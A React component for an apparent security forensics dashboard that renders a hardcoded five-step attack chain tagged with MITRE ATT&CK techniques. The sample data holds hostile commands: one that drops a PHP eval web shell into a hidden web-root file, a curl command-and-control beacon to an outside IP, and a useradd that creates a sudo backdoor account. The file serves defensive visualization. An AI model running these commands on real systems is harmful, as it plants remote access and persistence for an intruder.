import React from 'react'
import { Terminal, ShieldAlert, Cpu, ArrowRight, CornerDownRight } from 'lucide-react'
import { EvidenceEvent } from '../types'

interface ProcessTreeProps {
  evidence: EvidenceEvent[]
  hostName: string
}

export const ProcessTree: React.FC<ProcessTreeProps> = ({ evidence, hostName }) => {
  const steps = [
    {
      id: 'PT-01',
      title: 'Initial Access (Parent Daemon)',
      process: 'edgegate_httpd',
      pid: 1420,
      user: 'www-data',
      cmd: '/usr/sbin/edgegate_httpd -D FOREGROUND',
      phase: 'access',
      tag: 'T1190 Exploit Public-Facing App',
      color: 'border-rose-500/50 bg-rose-950/20 text-rose-300'
    },
    {
      id: 'PT-02',
      title: 'Spawned Shell Execution',
      process: '/bin/sh',
      pid: 1842,
      user: 'www-data',
      cmd: "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
      phase: 'execution',
      tag: 'T1059 Command and Scripting Interpreter',
      color: 'border-rose-500/60 bg-rose-950/30 text-rose-200'
    },
    {
      id: 'PT-03',
      title: 'Persistent Web Shell Implant',
      process: 'File Write / Persistence',
      pid: 0,
      user: 'www-data',
      cmd: '/var/www/html/assets/.sys_cache.php (SHA-256: 4a2d81f...)',
      phase: 'persistence',
      tag: 'T1505.003 Web Shell',
      color: 'border-rose-500 bg-rose-900/40 text-rose-100 font-bold'
    },
    {
      id: 'PT-04',
      title: 'Outbound Command & Control Beacon',
      process: 'curl',
      pid: 2104,
      user: 'root',
      cmd: 'curl -s -k https://198.51.100.42:8443/checkin (Every 60s)',
      phase: 'outbound_control',
      tag: 'T1071.001 Web Protocols C2',
      color: 'border-amber-500/60 bg-amber-950/30 text-amber-200'
    },
    {
      id: 'PT-05',
      title: 'Post-Patch Backdoor Account Creation',
      process: 'useradd',
      pid: 2210,
      user: 'root',
      cmd: '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit',
      phase: 'privilege_change',
      tag: 'T1136.001 Local Account',
      color: 'border-rose-500/80 bg-rose-950/40 text-rose-200'
    }
  ]

  const hasCompromise = evidence.some((e) => e.signal_class !== 'anomaly')

  if (!hasCompromise) {
    return (
      <div className="p-8 text-center glass-panel rounded-xl">
        <Cpu className="w-10 h-10 text-emerald-400 mx-auto mb-2 opacity-80" />
        <h3 className="text-base font-semibold text-slate-200">Normal Process Tree</h3>
        <p className="text-xs text-slate-400 mt-1 max-w-md mx-auto">
          No anomalous process parentage, web shell drops, or privilege escalation events detected for {hostName}.
        </p>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      <div className="p-3 bg-rose-950/20 border border-rose-500/30 rounded-lg text-xs text-rose-300 flex items-center gap-2">
        <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
        <span>
          <strong>Adversary Process Execution Chain:</strong> Forensic event sequence shows execution spawned directly from the compromised HTTP daemon to persistent root backdoor.
        </span>
      </div>

      <div className="space-y-2 relative pl-4 border-l-2 border-rose-500/40 ml-4 font-mono text-xs">
        {steps.map((step, idx) => (
          <div key={step.id} className="relative group">
            {/* Tree Branch line */}
            <div className="absolute -left-[22px] top-4 w-3.5 h-0.5 bg-rose-500/40" />

            <div className={`p-3 rounded-lg border ${step.color} shadow-sm transition hover:scale-[1.01]`}>
              <div className="flex items-center justify-between gap-2 mb-1 flex-wrap">
                <div className="flex items-center gap-2">
                  <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-900/80 text-cyan-300 font-bold border border-slate-700">
                    STEP {idx + 1}
                  </span>
                  <span className="font-bold text-slate-100">{step.title}</span>
                  <span className="text-[10px] text-slate-400 font-normal">
                    (User: <span className="text-amber-300 font-bold">{step.user}</span>
                    {step.pid > 0 ? ` · PID: ${step.pid}` : ''})
                  </span>
                </div>
                <span className="text-[10px] px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-slate-300">
                  {step.tag}
                </span>
              </div>

              <div className="bg-slate-950/80 p-2 rounded border border-slate-800 text-[11px] text-slate-300 overflow-x-auto flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                <code className="text-cyan-200 select-all">{step.cmd}</code>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}
